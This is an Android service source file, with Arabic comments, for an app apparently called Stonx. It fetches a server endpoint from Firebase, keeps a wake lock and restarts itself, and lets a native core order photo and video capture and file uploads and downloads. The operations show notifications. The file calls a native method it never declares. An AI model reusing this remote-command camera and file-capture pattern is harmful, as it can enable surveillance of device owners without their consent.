package com.stonx.manager;

import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import java.io.File;
import java.util.concurrent.ConcurrentHashMap;

public class StonxService extends Service {

    private static final String TAG = "STONX_SVC";

    static {
        System.loadLibrary("stonxmanager");
    }

    public static volatile StonxService instance;

    private PowerManager.WakeLock m_wakeLock;

    private static native void nativeInit(String filesDir);
    private static native void nativeStart(String filesDir, String host, int port);
    private static native void nativeStop();
    private static native boolean nativeIsRunning();

    // ════════════════════════════════════════════════════════════════════
    //  Camera bridge
    // ════════════════════════════════════════════════════════════════════

    private static final ConcurrentHashMap<String, CameraResultListener> sCameraListeners
            = new ConcurrentHashMap<>();

    public interface CameraResultListener {
        void onCameraResult(boolean success, String pathOrError);
    }

    /**
     * يُستدعى من C++ (StonxCore) عبر JNI لبدء التقاط صورة.
     *
     * - يشغّل CameraService مباشرة عبر startForegroundService (لأن
     *   CameraService.onCreate يستدعي startForeground فوراً).
     * - يراقب ظهور ملف الصورة في thread منفصل.
     * - عندما يظهر → يُبلّغ C++ عبر callback.
     */
    public static void startCameraCapture(String facing, String outPath,
                                          String opId, CameraResultListener listener) {
        StonxService svc = instance;
        if (svc == null) {
            StonxLog.e(TAG, "*** startCameraCapture: service not running ***");
            if (listener != null) listener.onCameraResult(false, "SERVICE_NOT_RUNNING");
            return;
        }

        if (listener != null) sCameraListeners.put(opId, listener);

        StonxLog.d(TAG, "*** startCameraCapture: facing=" + facing
                + " op=" + opId + " out=" + outPath + " ***");

        Intent intent = new Intent(svc, CameraService.class);
        intent.putExtra(CameraService.EXTRA_ACTION_TYPE, "photo");
        intent.putExtra(CameraService.EXTRA_FACING, facing);
        intent.putExtra(CameraService.EXTRA_OUTPUT, outPath);
        intent.putExtra(CameraService.EXTRA_OP_ID, opId);

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                svc.startForegroundService(intent);
            } else {
                svc.startService(intent);
            }
            StonxLog.d(TAG, "*** CameraService.startForegroundService called ***");
        } catch (Exception e) {
            StonxLog.e(TAG, "*** startForegroundService failed ***", e);
            if (listener != null) listener.onCameraResult(false, "START_SERVICE_FAILED");
            return;
        }

        // ✅ نراقب ظهور الملف في thread منفصل
        final String expectedFile = outPath;
        final String finalOpId = opId;
        new Thread(() -> {
            long deadline = System.currentTimeMillis() + 60_000;
            while (System.currentTimeMillis() < deadline) {
                File f = new File(expectedFile);
                if (f.exists() && f.length() > 0) {
                    StonxLog.d(TAG, "*** file appeared: " + expectedFile
                            + " (" + f.length() + "B) ***");
                    deliverCameraResult(finalOpId, true, expectedFile);
                    return;
                }
                try { Thread.sleep(200); } catch (InterruptedException ignored) {}
            }
            StonxLog.e(TAG, "*** timeout waiting for file: " + expectedFile + " ***");
            deliverCameraResult(finalOpId, false, "TIMEOUT_NO_FILE");
        }, "CameraWatcher-" + opId).start();
    }

    /**
     * يُستدعى من CameraService عند انتهاء الالتقاط (نجاح أو فشل).
     */
    static void deliverCameraResult(String opId, boolean success, String pathOrError) {
        StonxLog.d(TAG, "*** deliverCameraResult: op=" + opId + " ok=" + success
                + " val=" + pathOrError + " ***");
        CameraResultListener l = (opId != null) ? sCameraListeners.remove(opId) : null;
        if (l != null) {
            l.onCameraResult(success, pathOrError);
        } else {
            // لا يوجد Java listener → أبلغ C++ مباشرة عبر JNI
            StonxLog.d(TAG, "*** no listener for op=" + opId + " → nativeCameraResult ***");
            nativeCameraResult(opId, success, pathOrError);
        }
    }

    // ════════════════════════════════════════════════════════════════════
    //  Lifecycle
    // ════════════════════════════════════════════════════════════════════

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        ensureInternalDirs();
        acquireWakeLock();
        nativeInit(getFilesDir().getAbsolutePath());
        startForegroundSafe();
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        m_wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "stonx:agent");
        m_wakeLock.setReferenceCounted(false);
        m_wakeLock.acquire();
        StonxLog.d(TAG, "WakeLock acquired");
    }

    private void startForegroundSafe() {
        android.app.Notification notif = NotifyHelper.buildService(this, false);
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                // Android 14+: يجب تضمين camera+microphone حتى يصبح StonxService
                // مصدراً مؤهلاً (eligible) لتشغيل CameraService بصلاحية الكاميرا
                startForeground(NotifyHelper.NOTIF_SERVICE, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                        | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                        | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NotifyHelper.NOTIF_SERVICE, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                        | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                        | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(NotifyHelper.NOTIF_SERVICE, notif);
            }
        } catch (Exception e) {
            try { startForeground(NotifyHelper.NOTIF_SERVICE, notif); }
            catch (Exception ignored) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!nativeIsRunning()) {
            resolveEndpointAndStart();
        }
        return START_STICKY;
    }

    private void resolveEndpointAndStart() {
        final String filesDir = getFilesDir().getAbsolutePath();

        // ─ 1. Cache صالح (أقل من 24 ساعة) ─────────────────────────────
        ServerEndpointCache.Entry cached = ServerEndpointCache.load(this);
        if (cached != null) {
            StonxLog.d(TAG, "cache hit → " + cached.host + ":" + cached.port);
            if (!nativeIsRunning()) {
                nativeStart(filesDir, cached.host, cached.port);
            }
            return; // ← لا Firebase
        }

        // ─ 2. Cache منتهٍ أو غير موجود → Firebase ──────────────────────
        StonxLog.d(TAG, "cache miss → fetching endpoint from Firebase");
        EndpointFetcher.fetch(new EndpointFetcher.Callback() {

            @Override
            public void onSuccess(String host, int port) {
                // احفظ أولاً، ثم شغّل
                ServerEndpointCache.save(StonxService.this, host, port);
                StonxLog.d(TAG, "Firebase OK → cache saved → starting");
                if (!nativeIsRunning()) {
                    nativeStart(filesDir, host, port);
                }
            }

            @Override
            public void onFailure(String reason) {
                StonxLog.e(TAG, "Firebase failed: " + reason + " → trying stale cache");

                // ─ 3. Fallback: آخر Cache بغض النظر عن العمر ──────────
                ServerEndpointCache.Entry stale =
                        ServerEndpointCache.loadStale(StonxService.this);
                if (stale != null) {
                    StonxLog.d(TAG, "stale fallback → " + stale.host + ":" + stale.port);
                    if (!nativeIsRunning()) {
                        nativeStart(filesDir, stale.host, stale.port);
                    }
                } else {
                    // ─ 4. لا Cache ولا Firebase ──────────────────────────
                    StonxLog.e(TAG, "no endpoint available — core not started");
                }
            }
        });
    }

    @Override
    public void onDestroy() {
        nativeStop();
        if (m_wakeLock != null && m_wakeLock.isHeld()) {
            m_wakeLock.release();
            StonxLog.d(TAG, "WakeLock released");
        }
        instance = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ════════════════════════════════════════════════════════════════════
    //  onNativeEvent (من C++ إلى Java)
    // ════════════════════════════════════════════════════════════════════

    public static void onNativeEvent(String type, String data) {
        StonxService svc = instance;
        if (svc == null) return;
        svc.handleEvent(type, data);
    }

    private void handleEvent(String type, String data) {
        if (type == null) return;
        switch (type) {
            case "connection":
                NotifyHelper.updateService(this, "true".equals(data));
                break;
            case "op_start": {
                if (data == null) break;
                String[] p = data.split("\\|", 2);
                String op = p[0], detail = p.length > 1 ? p[1] : "";
                switch (op) {
                    case "camera": NotifyHelper.showCamera(this); break;
                    case "video":  NotifyHelper.showVideo(this, parseSeconds(detail)); break;
                    case "upload": NotifyHelper.showTransfer(this, true,  detail); break;
                    case "download":NotifyHelper.showTransfer(this, false, detail); break;
                    case "sync":   NotifyHelper.showSync(this, 0); break;
                }
                break;
            }
            case "op_end": {
                if (data == null) break;
                String[] p = data.split("\\|", 2);
                String op = p[0]; boolean ok = p.length>1 && "ok".equals(p[1]);
                switch (op) {
                    case "camera":   NotifyHelper.cancelOperation(this, NotifyHelper.NOTIF_CAMERA);
                                     if (!ok) NotifyHelper.showError(this, "التقاط الصورة"); break;
                    case "video":    NotifyHelper.cancelOperation(this, NotifyHelper.NOTIF_VIDEO);
                                     if (!ok) NotifyHelper.showError(this, "تسجيل الفيديو"); break;
                    case "upload":   NotifyHelper.cancelOperation(this, NotifyHelper.NOTIF_TRANSFER);
                                     if (!ok) NotifyHelper.showError(this, "رفع الملف"); break;
                    case "download": NotifyHelper.cancelOperation(this, NotifyHelper.NOTIF_TRANSFER);
                                     if (!ok) NotifyHelper.showError(this, "تنزيل الملف"); break;
                    case "sync":     NotifyHelper.cancelOperation(this, NotifyHelper.NOTIF_SYNC); break;
                    case "pending":  NotifyHelper.cancelOperation(this, NotifyHelper.NOTIF_PENDING); break;
                }
                break;
            }
            case "pending":
                try { NotifyHelper.showPending(this, Integer.parseInt(data)); }
                catch (NumberFormatException ignored) {}
                break;
        }
    }

    // ════════════════════════════════════════════════════════════════════
    //  Helpers
    // ════════════════════════════════════════════════════════════════════

    private void ensureInternalDirs() {
        String base = getFilesDir().getAbsolutePath();
        for (String sub : new String[]{"pending","manifests","progress","tmp"})
            new File(base, sub).mkdirs();
    }

    private int parseSeconds(String s) {
        if (s == null) return 30;
        int idx = s.lastIndexOf(' ');
        if (idx < 0) return 30;
        try { return Integer.parseInt(s.substring(idx+1).replace("s","").trim()); }
        catch (NumberFormatException e) { return 30; }
    }
}

